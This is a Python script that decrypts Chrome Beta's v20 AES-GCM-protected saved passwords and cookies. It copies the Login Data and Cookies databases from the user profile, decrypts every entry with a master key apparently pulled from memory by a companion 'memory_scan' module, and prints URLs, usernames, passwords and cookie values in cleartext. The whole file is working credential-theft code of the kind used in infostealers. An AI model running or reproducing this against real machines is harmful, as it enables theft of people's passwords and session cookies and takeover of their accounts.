"""
v20 blob decryption — Chrome 127+ AES-256-GCM password format.
"""
import os
import sqlite3
import shutil
from Crypto.Cipher import AES


def ardacan_decrypt(master_key: bytes, blob: bytes, strip: int = 0) -> str:
    """
    Decrypt a single v20 blob (password or cookie).

    Blob layout:
        [0:3]   b"v20"  — magic
        [3:15]  nonce   — 12-byte AES-GCM nonce
        [15:-16] ct     — ciphertext
        [-16:]  tag     — 16-byte GCM authentication tag

    strip: bytes to remove from the start of the decrypted plaintext.
        Passwords: strip=0 (plaintext is the raw password string).
        Cookies:   strip=32 (Chrome prepends a 32-byte per-domain binding
                   context to every cookie plaintext before encryption;
                   the actual cookie value starts at byte 32).

    Returns the plaintext string, or "<err>" on failure.
    """
    if not blob:
        return ""
    if blob[:3] not in (b"v20", b"v10"):
        return "<legacy-dpapi>"
    try:
        nonce = blob[3:15]
        ct    = blob[15:-16]
        tag   = blob[-16:]
        pt    = AES.new(master_key, AES.MODE_GCM, nonce=nonce).decrypt_and_verify(ct, tag)
        return pt[strip:].decode("utf-8", errors="replace")
    except Exception:
        return "<err>"


def ardacan_dump(master_key: bytes, login_data_path: str | None = None) -> list[dict]:
    """
    Dump all passwords from Chrome Beta Login Data using the given master key.
    Returns list of {url, username, password} dicts.
    """
    if login_data_path is None:
        lad = os.environ.get("LOCALAPPDATA", "")
        login_data_path = os.path.join(
            lad, "Google", "Chrome Beta", "User Data", "Default", "Login Data"
        )

    if not os.path.isfile(login_data_path):
        raise FileNotFoundError(login_data_path)

    tmp = os.path.join(os.environ.get("TEMP", ""), "_cb_ld.db")
    shutil.copy2(login_data_path, tmp)
    try:
        con  = sqlite3.connect(tmp)
        rows = con.execute(
            "SELECT origin_url, username_value, password_value FROM logins"
        ).fetchall()
        con.close()
    finally:
        try: os.unlink(tmp)
        except: pass

    results = []
    for url, user, blob in rows:
        pw = ardacan_decrypt(master_key, bytes(blob) if blob else b"")
        results.append({"url": url, "username": user, "password": pw})
    return results


def ardacan_dump_cookies(master_key: bytes, cookies_db_path: str | None = None) -> list[dict]:
    """
    Dump all cookies from Chrome Beta Cookies DB using the given master key.
    Returns list of {host, name, value} dicts.

    Cookie plaintext layout after AES-GCM decryption:
        [0:32]  per-domain binding context (Chrome internal, discarded)
        [32:]   actual cookie value string
    """
    if cookies_db_path is None:
        lad = os.environ.get("LOCALAPPDATA", "")
        cookies_db_path = os.path.join(
            lad, "Google", "Chrome Beta", "User Data", "Default", "Network", "Cookies"
        )

    if not os.path.isfile(cookies_db_path):
        raise FileNotFoundError(cookies_db_path)

    tmp = os.path.join(os.environ.get("TEMP", ""), "_cb_ck.db")
    shutil.copy2(cookies_db_path, tmp)
    try:
        con  = sqlite3.connect(tmp)
        rows = con.execute(
            "SELECT host_key, name, encrypted_value FROM cookies"
        ).fetchall()
        con.close()
    finally:
        try: os.unlink(tmp)
        except: pass

    results = []
    for host, name, blob in rows:
        val = ardacan_decrypt(master_key, bytes(blob) if blob else b"", strip=32)
        results.append({"host": host, "name": name, "value": val})
    return results


if __name__ == "__main__":
    from memory_scan import ardacan_get_key
    key = ardacan_get_key()
    if key:
        creds = ardacan_dump(key)
        for c in creds:
            print(f"URL  : {c['url']}")
            print(f"USER : {c['username']}")
            print(f"PASS : {c['password']}")
            print()
        cookies = ardacan_dump_cookies(key)
        print(f"\n[+] {len(cookies)} cookies")
        for ck in cookies[:10]:
            print(f"  {ck['host']}\t{ck['name']}\t{ck['value'][:60]}")
